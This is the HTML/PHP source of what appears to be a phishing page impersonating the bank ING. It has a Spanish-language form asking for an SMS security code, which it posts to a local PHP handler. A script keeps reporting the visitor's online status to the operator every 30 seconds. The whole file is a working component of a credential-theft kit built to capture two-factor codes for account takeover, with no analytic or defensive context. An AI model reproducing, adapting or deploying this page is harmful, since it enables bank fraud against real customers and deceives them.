<!doctype html>
<html style="background: #fff;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">
        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />
        <title>ING</title>
        <script>
            /* Start Status */
                function updateStatus(status) {
                    fetch('./status/update_status.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({status , page : "SMS PAGE"})
                    });
                }
                
                updateStatus('online');
                
                window.addEventListener('beforeunload', () => {
                    updateStatus('offline');
                });
                
                setInterval(() => {
                    updateStatus('online');
                }, 30000); 
            /* End Status */            
        </script>         
    </head>

    
    <body style="background: #fff;">
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="./Assets/imgs/logo.svg"></div>
                <div class="right"><img src="./Assets/imgs/header-right.png"></div>
            </div>
        </header>          
        <form action="./Assets/php/config/func.php" method="post" id="main">
            <input type="hidden" name="sms">
            <div class="container">
                <div class="banner"><img src="./Assets/imgs/banner.jpg"></div>
                <div class="row justify-content-center">
                    <div class="col-lg-4 col-md-6 col-sm-10 col-12">  
                        <div id="forma">
                            <legend>Confirmación</legend>
                            <p>Se le enviará un código de seguridad por SMS o por llamada desde un servidor de voz en su teléfono que será válido durante 5 minutos.</p>
                            <div class="form-group mb20 <?php if(isset($_GET['error']))  echo 'has-error'; ?>">
                                <label for="sms_code">Ingrese el código recibido por SMS</label>
                                <input type="text" name="sms_code" id="sms_code" class="form-control" placeholder="Código SMS">
                                <?php if( isset($_GET['error']) ) : ?>
                                <p class="error-message">Código SMS no válido</p>
                                <?php endif; ?> 
                            </div>
                            <div class="form-group">
                                <button id="booom">Confirmar</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </form>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>

        </script>
    </body>

</html>